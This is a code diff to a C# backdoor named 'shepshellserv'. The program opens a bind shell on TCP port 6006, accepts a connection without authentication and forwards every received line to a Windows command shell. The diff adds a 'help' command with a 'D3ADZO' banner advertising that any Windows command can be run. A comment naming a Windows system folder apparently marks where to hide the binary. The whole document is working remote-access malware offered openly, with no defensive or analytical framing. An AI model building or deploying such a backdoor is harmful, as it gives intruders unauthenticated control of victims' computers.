@@ -1,10 +1,10 @@
-﻿using System;
+//C:\Windows\ImmersiveControlPanel
+using System;
+using System.Threading;
 using System.Diagnostics;
+using System.IO;
 using System.Net;
 using System.Net.Sockets;
-using System.Threading;
-using System.IO;
-
 namespace shepshellserv
 {
     public class Backdoor
@@ -31,14 +31,13 @@ namespace shepshellserv
             {
                 int port = 6006;
 
-                    try
-                    {
-                        listener = new TcpListener(port);
-                        listener.Start();
-                        mainSocket = listener.AcceptSocket();
-                        break;
-                    }
-                    catch (Exception) { continue; }
+                try
+                {
+                    listener = new TcpListener(port);
+                    listener.Start();
+                    mainSocket = listener.AcceptSocket();
+                }
+                catch (Exception) {  }
 
                 Stream s = new NetworkStream(mainSocket);
                 inStream = new StreamReader(s);
@@ -61,17 +60,6 @@ namespace shepshellserv
                 toShell.AutoFlush = true;
                 shellThread = new Thread(new ThreadStart(getShellInput));
                 shellThread.Start();
-                outStream.WriteLine(@"
-
- _____   _   _   _____  ______    ___   ______  ______   _   _____       ______   _____   _   _  ______ 
-/  ___| | | | | |  ___| | ___ \  / _ \  | ___ \ |  _  \ ( ) /  ___|      | ___ \ |_   _| | \ | | |  _  \
-\ `--.  | |_| | | |__   | |_/ / / /_\ \ | |_/ / | | | | |/  \ `--.       | |_/ /   | |   |  \| | | | | |
- `--. \ |  _  | |  __|  |  __/  |  _  | |    /  | | | |      `--. \      | ___ \   | |   | . ` | | | | |
-/\__/ / | | | | | |___  | |     | | | | | |\ \  | |/ /      /\__/ /      | |_/ /  _| |_  | |\  | | |/ / 
-\____/  \_| |_/ \____/  \_|     \_| |_/ \_| \_| |___/       \____/       \____/   \___/  \_| \_/ |___/  
-                                                                                                        
-% D3ADZO %                                                                                                        
-");
                 getInput();
                 dropConnection();
 
@@ -101,7 +89,7 @@ namespace shepshellserv
             {
                 String tempBuff = "";
                 while (((tempBuff = inStream.ReadLine()) != null))
-                { 
+                {
                     handleCommand(tempBuff);
                 }
             }
@@ -119,8 +107,29 @@ namespace shepshellserv
                     outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                     dropConnection();
                 }
-                toShell.WriteLine(com + "\r\n");
-                toShell.WriteLine("EOFX\r\n");
+                else if (com.Equals("help"))
+                {
+                    outStream.WriteLine(@"
+ _____   _   _   _____  ______    ___   ______  ______   _   _____       ______   _____   _   _  ______ 
+/  ___| | | | | |  ___| | ___ \  / _ \  | ___ \ |  _  \ ( ) /  ___|      | ___ \ |_   _| | \ | | |  _  \
+\ `--.  | |_| | | |__   | |_/ / / /_\ \ | |_/ / | | | | |/  \ `--.       | |_/ /   | |   |  \| | | | | |
+ `--. \ |  _  | |  __|  |  __/  |  _  | |    /  | | | |      `--. \      | ___ \   | |   | . ` | | | | |
+/\__/ / | | | | | |___  | |     | | | | | |\ \  | |/ /      /\__/ /      | |_/ /  _| |_  | |\  | | |/ / 
+\____/  \_| |_/ \____/  \_|     \_| |_/ \_| \_| |___/       \____/       \____/   \___/  \_| \_/ |___/  
+                                  
+% D3ADZO % 
+
+Use this bind shell to execute any Windows commands. 
+Sending the command <help> will bring this up again.
+");
+                    toShell.WriteLine("EOFX\r\n");
+                }
+                else
+                {
+                    toShell.WriteLine(com + "\r\n");
+                    toShell.WriteLine("EOFX\r\n");
+                }
+                
             }
             catch (Exception) { dropConnection(); }
         }
